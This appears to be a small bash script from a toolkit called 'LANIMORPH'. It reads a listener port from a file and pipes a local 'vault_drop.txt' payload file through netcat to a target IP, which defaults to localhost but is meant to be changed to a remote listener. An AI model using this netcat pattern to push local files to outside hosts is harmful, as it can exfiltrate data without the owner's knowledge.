#!/usr/bin/env bash
# LANIMORPH :: Auto-Port Injector

TARGET_IP="127.0.0.1"  # Change to listener IP if remote
PORT_FILE="$HOME/LANIMORPH/chain/current_port.txt"
PAYLOAD_FILE="$HOME/LANIMORPH/vault/vault_drop.txt"

if [[ ! -f "$PORT_FILE" ]]; then
  echo "[!] No active listener port found."
  exit 1
fi

PORT=$(cat "$PORT_FILE")
echo "[>] Sending payload to $TARGET_IP:$PORT"
cat "$PAYLOAD_FILE" | nc "$TARGET_IP" "$PORT"
echo "[✓] Payload sent."
